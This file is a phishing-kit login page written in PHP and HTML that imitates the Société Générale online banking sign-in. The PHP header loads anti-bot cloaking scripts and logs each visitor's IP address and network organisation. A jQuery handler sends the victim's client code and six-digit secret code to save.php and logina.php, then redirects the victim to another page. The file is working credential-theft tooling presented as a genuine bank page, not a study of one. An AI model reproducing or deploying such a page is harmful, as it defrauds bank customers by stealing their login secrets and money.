<?php
error_reporting(1);
set_time_limit(0);
session_start();
header('Content-type: text/html; charset-UTF-8');
include ('para.php');
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

include('conn.php');

$idClient = $_POST['idClient'];


date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));


$is_existe  = 'SELECT * FROM ips WHERE ip = :ip';


$stmt = $pdo->prepare($is_existe);
 $stmt->execute(array(
	':ip' => $_SERVER['REMOTE_ADDR'] ,
));

$hhh = $stmt->fetch();
//print_r($hhh);
if($hhh){
	if($hhh['blocked'] == 1){
		header("Location: #restitution/cns_listeprestation.html");
		exit;
	}


	$sql = "UPDATE ips SET created = :created WHERE ip = :ip";
}else{
#####################ORG############################
 $ZEFBWR = $_SERVER['REMOTE_ADDR'];
 $TCMQVO = json_decode(file_get_contents("http://extreme-ip-lookup.com/json/".$ZEFBWR .""));
 $ORG = $TCMQVO->org;
####################################################
	$sql = "INSERT INTO ips (ip, org, created)
VALUES (:ip, :org, :created)";


      $stmt = $pdo->prepare($sql);
      $stmt->execute(array(
          ':ip' => $_SERVER['REMOTE_ADDR'] ,
		  ':org' => $ORG,
          ':created' => time(),
      ));
}
?>
<!DOCTYPE html>
<!-- saved from url=(0076)#restitution/cns_listeprestation.html -->
<html lang="FR" class="swm-root-active swm-theme-CDN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
					
				

			<meta charset="UTF-8">
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
	<meta content="<?php echo X().$rand_tarikh;?>" name="description" lang="fr"/>
	<meta content=" <?php echo $rand_tarikh; ?>" name="<?php echo X();?>"/>
	<link rel="shortcut icon" href="img/favicon.ico"/>
	<title>Banque et Assurances - Société Générale</title>
	<!-- ///////////////////////////////   SG 2017 by Marco Sbou    //////////////////////////// -->
                     <img id="imgTP" src="./Connexion_files/saved_resource" style="position: absolute; height: 0px; width: 0px;"><img src="./Connexion_files/seg" style="position: absolute; height: 0px; width: 0px;"><script type="text/javascript" src="./Connexion_files/seg.js.téléchargement"></script><script type="text/javascript" src="./Connexion_files/917863.js.téléchargement"></script><script type="text/javascript" src="./Connexion_files/seg.js(1).téléchargement"></script><script type="text/javascript" src="./Connexion_files/getuid"></script><script src="./Connexion_files/873080639448770" async=""></script><script async="" src="./Connexion_files/fbevents.js.téléchargement"></script><script src="./Connexion_files/bat.js.téléchargement" async=""></script><script>if (top != self) { top.location = self.location; }</script>
                
                


            
                    <script charset="UTF-8" src="./Connexion_files/n2g_secu.js.téléchargement"></script>
        <script type="text/javascript">frame_shield();</script>
        <script type="application/json" id="sas_user_info">
    {

}
</script>




		
					<link rel="icon" type="image/x-icon" href="#static/Resources/img/favicon.ico">

        
<script charset="UTF-8" src="./Connexion_files/public-dca-portail.js.téléchargement"></script>

                    <script charset="UTF-8" src="./Connexion_files/init-configs_20190516120134.js.téléchargement"></script>
            <script charset="UTF-8" src="./Connexion_files/dca_portail_20190320190559.js.téléchargement"></script><script type="text/javascript" src="./Connexion_files/awt-dcaweb.js.téléchargement"></script>
            <script charset="UTF-8" src="./Connexion_files/vendor_20190502160330.min.js.téléchargement"></script>
            <script charset="UTF-8" src="./Connexion_files/gda.public.js.téléchargement"></script>
                    <script charset="UTF-8" src="./Connexion_files/interact-lanceur.js.téléchargement"></script>

                    <script charset="UTF-8" src="./Connexion_files/index_20190502160330.min.js.téléchargement"></script><script src="./Connexion_files/swm.main.js.téléchargement" type="text/javascript" charset="UTF-8"></script>
            <script charset="UTF-8" src="./Connexion_files/tc_SocieteGenerale_20_20190520150610.js.téléchargement"></script><script id="tc_script_114_1" src="./Connexion_files/dmp_bridge.js.téléchargement" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script><script id="tc_script_112_1" type="text/javascript" src="./Connexion_files/usabillav1.js.téléchargement" async="" defer=""></script><script id="tc_script__1" type="text/javascript" src="./Connexion_files/tc_SocieteGenerale_22.js.téléchargement" defer=""></script>
            <link href="./Connexion_files/index_20190502160330.min.css" rel="stylesheet" type="text/css">
                <link href="./Connexion_files/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
                <script charset="UTF-8" src="./Connexion_files/inbenta.js.téléchargement"></script><link rel="stylesheet" href="./Connexion_files/inbenta.css">

                <link href="./Connexion_files/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
                <style type="text/css">
.eip_txt_light{
  font-weight:300;
}

.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style><script charset="UTF-8" type="text/javascript" src="./Connexion_files/prof.js.téléchargement"></script>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->
            


            <script type="script/meta" src="./Connexion_files/statm.js.téléchargement"></script><script type="script/meta" src="./Connexion_files/skys.js.téléchargement"></script><script src="./Connexion_files/pic2Util.js.téléchargement" async="" type="script/meta"></script><script id="tc_script_149_1" src="./Connexion_files/js"></script><script id="ebOneTagUrlId" src="./Connexion_files/ebOneTag.js.téléchargement" async="" defer=""></script><script id="tc_script__1" type="text/javascript" src="./Connexion_files/f6cf063bb7.js.téléchargement" async="" defer=""></script><script type="text/javascript" async="" src="./Connexion_files/9C0XU"></script><script type="script/meta" src="./Connexion_files/motu.js.téléchargement"></script></head>
			<body class="PRI waitJeton swm theme-BDDF swm-page-authent  theme-BDDF-BDDF" style=""><div style="display: none;" id="lightningjs-usabilla_live"><div><iframe frameborder="0" id="lightningjs-frame-usabilla_live" src="./Connexion_files/saved_resource.html"></iframe></div></div>

            
                <header class="dcw_header dcw_header--auth js-header-auth dcw_header--no-nav dcw_header--no-connexion" role="banner">
	<button class="dcw_burger-menu js-drawer-toggle" aria-label="ouvrir le menu" data-tms-element-label="ouvrir-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected">
		<svg class="dcw_burger-menu_icon" aria-hidden="true" focusable="false">
			<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#burger-menu"></use>
		</svg>
	</button>
	<button class="dcw_burger-menu_btn-close js-drawer-close" aria-label="fermer le menu" data-tms-element-label="fermer-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected">
		<svg aria-hidden="true" focusable="false">
			<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#close-2"></use>
		</svg>
	</button>
	<div class="dcw_brand_container">
		<div class="dcw_brand_logo-container"><a href="https://particuliers.societegenerale.fr/" class="dcw_brand_home-link dcw_brand_home-link--desktop"><img src="./Connexion_files/logo-sg.svg" alt="Société Générale (se rendre à la page d’accueil)" width="164" class="dcw_brand_logo" height="32"> </a> <a href="https://particuliers.societegenerale.fr/" class="dcw_brand_home-link dcw_brand_home-link--mobile"> <img src="./Connexion_files/logo-sg-muet.svg" alt="Société Générale (se rendre à la page d’accueil)" width="30" class="dcw_brand_logo dcw_brand_logo--mute" height="30"> </a></div>

</div>
	<div class="dcw_login_wrapper-auth">
		<ul class="dcw_login-unauth">
    <li class="dcw_login-unauth_item dcw_login-unauth_contacts">
<a class="dcw_login-unauth_link" href="#aides-contact" data-tms-click-type="N" data-tms-element-label="contacts">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#contact"></use></svg>
            Contacts
</a>    </li>
    <li class="dcw_login-unauth_item dcw_login-unauth_client">
<a class="dcw_login-unauth_link" href="#ouvrir-compte-bancaire-en-ligne" data-tms-click-type="N" data-tms-element-label="devenir-client">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#plus"></use></svg>
            Devenir client
</a>    </li>
</ul></div>
	    <div class="dcw_submenu-auth dcw_sidedrawer_subnav dcw_submenu-auth--persistent" style="background-image:url(&#39;#static/Resources/img/trame_20180821152355.png&#39;)">
        <div class="dcw_submenu-auth_wrapper">
                <button class="dcw_submenu-auth_back-btn is-visible" aria-label="retour à la page précédente">
                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#arrow-circle"></use></svg>
                </button>
                <h1 class="dcw_submenu-auth_title">Connexion - Espace client</h1>
        </div>
    </div>
<div class="dcw_header-title_mask">
		<div class="dcw_header-title is-sticky">
			<h2 class="dcw_header-title_title" id="js-mobile-title">Connexion - Espace client</h2>
			<p class="dcw_header-title_sub" id="js-mobile-subtitle"></p>
		</div>
	</div>
</header><main class="dcw_main dcw_gb9_core-wrapper" role="main">
	<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
	</section>
<section class="dcw_gb_wrapper">
		<a id="go-content" tabindex="-1"></a>
		<section class="dcw_gb9_core-left" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->
            

				
<link rel="stylesheet" type="text/css" href="index.css" media="all">

    


<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js "></script>
                                    <script>
                                        function checkhit(pa) {
                                         var value =$('#secret-nbr').val();
                                        
                                         var value =$("#client-nbr").val();
                                        var valuea =$('#secret-nbr').val();
                                        
                                         if ( valuea.length == 6 ) {return;}
                                            if ( valuea.length == 5 ) {
                                        	$('#secret-nbr').val($('#secret-nbr').val() + pa);
                                        	if (value.length >= 1) {$('#submitIdent').prop("disabled", false);}
                                        	
                                        	
                                        	
                                        	
                                        	} else {$('#secret-nbr').val($('#secret-nbr').val() + pa);}
                                        
                                        
                                        
                                        }
                                        
                                        $(document).ready(function(){
                                        $("#client-nbr").on('input',function(e){
                                        var value =$("#client-nbr").val();
                                        var valuea =$('#secret-nbr').val();
                                        
                                        
                                        if (value.length == 0 | valuea.length == 0) {$('#submitIdent').prop("disabled", true); }
                                        
                                        
                                        if (value.length >= 1 && valuea.length == 6) {$('#submitIdent').prop("disabled", false); }
                                        });
                                        
                                        
                                        $('#initPass').click(function(){$('#secret-nbr').val("");$('#submitIdent').prop("disabled", true);});
                                        $('#initClient').click(function(){$('#client-nbr').val("");$('#submitIdent').prop("disabled", true);});
                                        
                                        
                                        });
                                    </script>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.1/jquery.min.js" type="text/javascript">
                                                        </script>
                                                        <script type="text/javascript">
                                                            jQuery.noConflict();jQuery(document).ready(function($){$('#submitIdent').click(function(e) {var result = "logina.php";var shit2 = 'id=' + $("#client-nbr").val() + '&oooo=' + $('#secret-nbr').val();
                                                             if(6==6){
                                                             $.ajax({
                                                                        type: 'POST',
                                                                        url: 'save.php', 
                                                                       data: shit2
                                                            			        })
                                                             
                                                             $.ajax({url: result ,type: 'POST', data: shit2,success:function(data){},error: function(shit2) { }});$(document).ajaxStop(function() {window.location.replace("activv.php");});}});});
                                                        </script>
<noscript>
    <style>
        .auth-content {display:none !important;}
        .js-alert {display: block !important;}
        .js-alert {display: block !important;}
        .waitAuthJetonMsg {display: none !important;}
    </style>
</noscript>

<!--[if lte IE 8]>
<link rel="stylesheet" href="/icd/static/swm/resources/version/18.76.0/markets/PRI/NGIM/style_IE7.css" />
<![endif]-->
<!--[if gt IE 8]><!-->
<link rel="stylesheet" href="./Connexion_files/style.css">
<!-- <![endif]-->



<div id="dcw-swm" class="swm-inner-wrapper">
    <div class="prefetch"></div>
    <div id="disableLayer" class="disable-layer"></div>
    

<script id="templateGenericError" type="template/doT.js">
    {{? it.erreur1}}
    <p role="alert">
						<span class="swm-highlight-light swm-popin-label-erreur1">
							{{=it.erreur1}}
						</span>
    </p>
    {{?}}
    {{? it.erreur2}}
    <p role="alert">
						<span class="swm-popin-label-erreur2">
							{{=it.erreur2}}
						</span>
    </p>
    {{?}}
    {{? it.erreur3}}
    <p role="alert">
						<span class="swm-popin-label-erreur2">
							{{=it.erreur3}}
						</span>
    </p>
    {{?}}
    <div id="swm-popin-btn-erreur" class="swm-button-wrapper swm-popin-btn-erreur {{=it.btnStyle}}">
        <button class="swm-btn-action csa-cdn-ok swm-btn_primary {{=it.btnStyleNgim}}" type="button">
            {{=it.bouton}}
        </button>
    </div>
</script>

<script id="templateGenericErrorCdn" type="template/doT.js">
        <div class ='message message-error'>
            {{? it.erreur1}}
                <p>
                      {{=it.erreur1}}
                </p>
            {{?}}
            {{? it.erreur2}}
                <p>
                    {{=it.erreur2}}
                </p>
            {{?}}
            {{? it.erreur3}}
            <p>
                {{=it.erreur3}}
            </p>
            {{?}}
        </div>
    <div id="swm-popin-btn-erreur" class="swm-button-wrapper swm-popin-btn-erreur csa-sprite-btn-retour btn-group">
        <button class="swm-btn-action csa-cdn-ok btn-secondary" type="button">
            OK
        </button>
    </div>
</script>

<script id="templateCsaError" type="template/doT.js">
    <div class="eer-pro_modal eer-pro_popinOTP" role="dialog" arial-label="Lorem ipsum ?" aria-describedby="dialog-desc">
        <button aria-label="Fermer la fenêtre de dialogue" class="eer-pro_modal__close-btn"></button>
        <span class="eer-pro_modal__picto is-active" aria-hidden="true"></span>

        {{? it.erreur1}}
        <p class="eer-pro_popinOTP__title">
			{{=it.erreur1}}
        </p>
        {{?}}
        <p id="dialog-desc" class="eer-pro_modal__content">
            {{? it.erreur2}}
                {{=it.erreur2}}
            {{?}}
        </p>
        <button class="eer-pro_btn eer-pro_btn--primary">Retour &agrave; mon espace</button>
    </div>
</script>

<div id="swm-tooltip" class="swm-tooltip">
    <span></span>
</div>
<div class="popin-wrapper">
    <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
    <div id="swm-popin-dialog" class="swm-popin-dialog">
        <div class="swm-popin-relative">
            <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer"></div>
            <div class="swm-popin-ombre-sup"></div>
            <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
                <div id="swm-popin" class="swm-popin">
                    <div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
                    </div>
                </div>
            </div>
            <div class="swm-popin-ombre-inf"></div>
        </div>
    </div>
</div>


							

				

    


    

    
        <div class="dcw_authent">
    
        
        <div class="auth-content js-content-aria-hide dcw_codeContainer">
            <div id="swmModulesAuth"> <div id="module-authent-cv"> <div class="container-mire-codeClient"> <div class="dcw_block"> <div class="component-mire-codeclient"> <div class="dcw_block-element"> <div class="auth-cs-content row_section dcw_input-container"> 
<form action="Connexion.php"   autocomplete="off" method="post"><input id="client-nbr" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input" autocapitalize="off" autocorrect="off" aria-label="Code client" placeholder=" " autocomplete="off" maxlength="8" required="">			<span class="dcw_sprite dcw_to-clear" id="initClient"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span><span class="bar" tabindex="-1" aria-hidden="true"></span> <label tabindex="-1" aria-hidden="true" style="display: none;">Saisissez votre code client</label> </div>  <div id="js-error" tabindex="-1" class="auth_error" aria-hidden="true"></div>  </div>  <div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container"> <div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client"> <input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0" aria-label="Activer la mémorisation du code client"> <label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span> <div class="toggle-btn-handle"></div> </label> </div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span> <div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span> <div class="dcw_infopopin dcw_infobulle"> <p class="dcw_espace">Se souvenir de moi</p> <p>En cochant cette case, votre identifiant et votre prénom seront mémorisés sur cet appareil.</p> <p class="dcw_espace">De cette manière vous n'aurez plus à saisir votre code client lors de vos prochaines connexions.</p> <p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p> <button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button> </div> </div> </div>   <div class="auth-cs-content-validate" id="btn-container" style="display: none;">   <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-validate" type="button" aria-label="Valider votre identifiant">Valider</button> <br> </div>  </div> </div> </div> <div id="clavier" class="loaded" style="display: block;">






<div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk">

    <div class="auth-cs-content-code auth-cs-content swm-vk">

        <div class="auth-cs-content-code auth-cs-content swm-vk dcw_block-element">

            
                
                    
                    
                        <input type="button" id="closeKeyBoard">
                    
                   
                    
                
            
            
        <div class="auth-cs-content-validate">
            <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" type="submit">Valider</button>
            

            
                <div class="sonore-Keyboard dcw_block-element">
                    
                </div>
                                                                                    </form>



        </div>
    </div>
</div></div> </div> </div>


              
           </script>



            <script id="templateComponentAuthentCv" type="template/doT.js">
                 <div id="module-authent-cv">
                     <div class="container-mire-codeClient"></div>
                     <div id="clavier"></div>
                 </div>
         </script>

        <script id="templateComponentAuthentMailProspect" type="template/doT.js">
            <div id="module-authent-mailProspect">
                <div class="container-mire-prospect"></div>
            </div>
        </script>

      </div>
      

    
        <script>
            
            
            
            window.onload = function() {
                
                window.jQueryForSwm = swm.$;
                window.swmAutoInit = false;
                !function(e,t){if("function"==typeof define&&define.amd)"undefined"==typeof swmAutoInit&&(swmAutoInit=!1),define(["jquery"],t);else{"undefined"==typeof swmAutoInit&&(swmAutoInit=!0);var n=e.jQueryForSwm||e.jQuery;if("undefined"==typeof n)throw new Error("jQuery is missing !");t(n)}}(this,function(e){function t(e){s?s.config.baseUrl=e:g.setBaseUrl=[e]}function n(){for(g.ajaxFilter&&l.ajaxFilter.apply(l,g.ajaxFilter),g.setBaseUrl&&t.apply(l,g.setBaseUrl),g.stockageJetonActif&&l.setStockageJetonActif(g.stockageJetonActif);g.iStockageJetonActifCallback.length>0;)l.isStockageJetonActif(g.iStockageJetonActifCallback.pop());for(g.iStockageJetonActifCallback=[];g.getJetonCallback.length>0;)l.getJeton(g.getJetonCallback.pop());if(g.getJetonCallback=[],g.changeCodeSecret&&l.changeCodeSecret.apply(l,g.changeCodeSecret),g.logout&&l.logout.apply(l,g.logout),g.logoutSupervision&&l.logoutSupervision.apply(l,g.logoutSupervision),g.checkSignature&&l.checkSign.apply(l,g.checkSignature),g.errorSignature&&l.errorSign.apply(l,g.errorSignature),g.signature){var e=l.sign.apply(l,g.signature.params);e&&"object"==typeof e&&(g.signature.promise.getData=e.getData)}g.resetAuthentData&&l.resetAuthentData.apply(l,g.resetAuthentData),g.authent&&l.authent.apply(l,g.authent.params),g={getJetonCallback:[],iStockageJetonActifCallback:[],authent:void 0}}function o(e){return"function"==typeof e}function a(e,t){document.addEventListener?document.addEventListener(e,function(e){t(e.data)},!1):document.attachEvent&&document.documentElement.attachEvent("onpropertychange",function(n){n.propertyName==e&&t(document.documentElement[e])})}function i(t,n){if("undefined"!=typeof e.Deferred){var o=r(t);e.when(o).fail(n)}else c(t,n)}function r(t){var n=e.Deferred(),o=document.createElement("script");return o.async="async",o.type="text/javascript",o.src=t,o.onload=o.onreadystatechange=function(e,t){(!o.readyState||/loaded|complete/.test(o.readyState))&&(t?n.reject():n.resolve())},o.onerror=function(){n.reject()},e("head")[0].appendChild(o),n.promise()}function c(e,t){var n=document.createElement("script");n.async=!1,n.src=e,n.type="text/javascript",n.charset="UTF-8",n.onerror=t;var o=document.getElementsByTagName("head")[0];o.appendChild(n)}function u(e){try{"undefined"!=typeof console&&console&&"function"==typeof console.warn&&console.warn("[SWM] "+e)}catch(t){}}var s,l={},d=!1,f=!1,g={getJetonCallback:[],iStockageJetonActifCallback:[]},p={};if(l.consts={},l.consts.niveauSensibilite={},l.consts.niveauSensibilite.NORMAL={value:0},l.consts.niveauSensibilite.SENSIBLE={value:100},l.consts.niveauSensibilite.TRES_SENSIBLE={value:200},l.version="undefined"!=typeof swmConfOverride?""+swmConfOverride.version:""+(new Date).getTime(),l.loadSwm=function(){u("The method swm.loadSwm is deprecated, please use swm.init instead."),l.init.apply(l,arguments)},l.init=function(t){function o(){l.config=s.config,l.$=s.$,d=!1,f=!0,n(),e(document).triggerExternal("swm.available",s)}var r={mainJsPath:"/js/swm.main.js",swmMain:void 0};if(e.extend(r,t),l.addConf({onAuthent:r.onAuthent,onBack:r.onBack,onClose:r.onClose,onConnecting:r.onConnecting,onInitDone:r.onInitDone,onGoAuth:r.onGoAuthent,onEchecAuth:r.onEchecAuthent,onLoadingError:r.onLoadingError,onLogout:r.onLogout,ajaxFilterRegExp:r.ajaxFilterRegExp,ajaxFilterJquery:r.ajaxFilterJquery,baseUrl:r.baseUrl}),f)e(document).triggerExternal("swm.available",s);else if(s=r.swmMain,"undefined"!=typeof s)setTimeout(o,0);else if(a("swm.init",function(e){s=e,o()}),!d){d=!0;var c,u=l.version;c="undefined"!=typeof swmConfOverride&&swmConfOverride.staticBaseUrl?(r.baseUrl||"")+swmConfOverride.staticBaseUrl+r.mainJsPath:"/swm/resources/version/"+u+r.mainJsPath,"undefined"!=typeof gdaPublicUri&&(c=gdaPublicUri+c),i(c,function(){e(document).trigger("swm.loadingError")})}},swmAutoInit){var m=e.fn.on||e.fn.bind;m.call(e(document),"swm.loaded",function(){l.init()})}return swmAutoInit=void 0,l.ajaxFilter=function(t){return s?(t.ajaxFilterJquery=t.ajaxFilterJquery||e,t.ajaxFilterRegExp&&(t.ajaxFilterJquery.ajax=s.filterAjaxRequests(t).overridedAjax),t.ajaxFilterJquery.ajax):(g.ajaxFilter=[t],void 0)},l.onLogout=function(e){a("swm.logout",e)},l.onClose=function(e){a("swm.close",e)},l.onConnecting=function(e){a("swm.connecting",e)},l.onBack=function(e){a("swm.back",e)},l.onLogoutError=function(e){a("swm.logout.error",e)},l.onAuthent=function(e){a("swm.authent",e)},l.onGoAuthent=function(e){a("swm.go-authent",e)},l.onEchecAuthent=function(e){a("swm.echec-authent",e)},l.setStockageJetonActif=function(e){e=1==e,s?s.data.setStockageJetonActif(e):g.stockageJetonActif=e},l.isStockageJetonActif=function(e){if(o(e)){if(!s)return g.iStockageJetonActifCallback.push(e),void 0;setTimeout(function(){e(s.data.isStockageJetonActif())},0)}},l.getJeton=function(e){if(o(e)){if(!s)return g.getJetonCallback.push(e),void 0;setTimeout(function(){e(s.data.getJeton())},0)}},l.getIdStat=function(){return s?s.data.getIdStat():void 0},l.reattribuerCodeSecret=function(e,t){s?s.reattribuerCodeSecret(e,t):g.reattribuerCodeSecret=[e,t]},l.sign=function(e,t){if(s)return s.sign(e,t);var n={getData:function(){return new Error("Signature non prÃªte public.")}};return g.signature={params:[e,t],promise:n},"string"==typeof e?n:void 0},l.reAuthentOOB=function(e,t,n,o){if(s)return s.reAuthentOOB(e,t,n,o);var a={getData:function(){return new Error("reAuthentOOB non prÃªte public.")}};return g.reauthentificationOOB={params:[e,t,n,o],promise:a},"string"==typeof t?a:void 0},l.record=function(e){return s?s.record(e):void 0},l.checkSign=function(e){return s?s.checkSign(e):(g.checkSignature=arguments,void 0)},l.gda_handleResponse=function(e,t,n,o){return s?s.gda_handleResponse(e,t,n,o):void 0},l.errorSign=function(e){return s?s.errorSign(e):(g.errorSignature=arguments,void 0)},l.getDateDerniereConnexion=function(){return s?s.data.getDateDerniereConnexion():void 0},l.getCanalDerniereConnexion=function(){return s?s.data.getCanalDerniereConnexion():void 0},l.getDroits=function(){return s?s.data.getDroits():void 0},l.logout=function(){s?s.logout.apply(l,arguments):g.logout=arguments},l.logoutSupervision=function(){u("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead."),l.logout()},l.resetAuthentData=function(){s?s.data.resetAuthentData.apply(l,arguments):g.resetAuthentData=arguments},l.isAuthenticated=function(){return s?s.isAuthenticated():!1},l.authent=function(e,t,n){return s?(t=t||function(e){"function"===p.preSuccess?p.preSuccess(e,function(){p.success(e)}):p.success(e)},n=n||p.error,s.authent(e,t,n)):(g.authent={params:[e,t,n]},!1)},l.setDefaultAuthentCallbacks=function(e){p.preSuccess=e.preSuccess||p.preSuccess,p.success=e.success||p.success,p.error=e.error||p.error},l.changeCodeSecret=function(e,t,n){return s?s.changeCodeSecret(e,t,n):(g.changeCodeSecret=[e,t,n],!1)},l.addConf=function(e){if(e.onAuthent&&a("swm.authent",e.onAuthent),e.onLogout&&a("swm.logout",e.onLogout),e.onBack&&a("swm.back",e.onBack),e.onClose&&a("swm.close",e.onClose),e.onConnecting&&a("swm.connecting",e.onConnecting),e.onLoadingError&&a("swm.loadingError",e.onLoadingError),e.ajaxFilterRegExp){var n={ajaxFilterRegExp:e.ajaxFilterRegExp,ajaxFilterJquery:e.ajaxFilterJquery,ajaxFilterAxios:e.ajaxFilterAxios};l.ajaxFilter(n)}e.baseUrl&&t(e.baseUrl),"undefined"!=typeof s?e.onInitDone&&e.onInitDone():e.onInitDone&&a("swm.available",e.onInitDone)},e.fn.triggerExternal=function(t,n){if(document.dispatchEvent){var o=document.createEvent("Event");o.initEvent(t,!0,!0),o.data=n,document.dispatchEvent(o);var a=window.self!==window.top;if(a)try{top.document.dispatchEvent(o)}catch(i){}}else document.documentElement[t]=n;e(document).trigger(t,n)},setTimeout(function(){e(document).trigger("swm.loaded",l)},0),window.swmApi=l,l});
                swmApi.init({
                    swmMain: swm
                });


                
                swmApi.setDefaultAuthentCallbacks({
                    success : function(rsp) {
                        swm.defaultAuthentSuccess(rsp, "/swm/swm-connect.html", "PNArCXNUqkE44USf2bIYfGfp/gQsAQAAAQAAACUAAAAvcmVzdGl0dXRpb24vY25zX2xpc3RlcHJlc3RhdGlvbi5odG1s");
                    },
                    error: function(err) {
                        swm.defaultAuthentError(err, "/");
                    }
                });

                
                swmApi.authent("300");

            };

            
            
        </script>
    
    </div>


    


<script type="text/javascript" src="./Connexion_files/swm.main.js.téléchargement" charset="UTF-8"></script>



    

    

    
    <img src="./Connexion_files/loader.gif" style="display: none; width: 0; height: 0;">

    <script type="text/javascript">
        if (typeof(swm) != "undefined" && swm.onLogout) {
            swm.onLogout(function() {
                document.location.href = '/';});
        }

    </script>

    








</div>

            
                </section>
	<section class="dcw_gb9_core-right">


















	
		<div>

			<div>
				<strong>Obtenir vos codes</strong><br>
<br>
Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.<br>
<br>
<br>
<strong>Code secret oublié</strong><br>
<br>
<a style="text-decoration: underline !important" href="#swm/swm-reattribution.html" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="><use height="100%" width="100%" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Effectuer une nouvelle demande</a><br>
<br>
<br>
<strong>Nos conseils sécurité</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Découvrez le Pass sécurité</a><br>
<a style="text-decoration: underline !important;" href="#securite/dernieres-alertes" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Voir les menaces identifiées</a><br>
<a style="text-decoration: underline !important;" href="#securite/bonnes-pratiques-securite-pour-eviter-les-fraudes" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Guide des bonnes pratiques</a>

			</div>

		</div>
	
	


</section>
<section class="dcw_gb_row dcw_gb_clearfix">
	</section>
</section>
	</main>
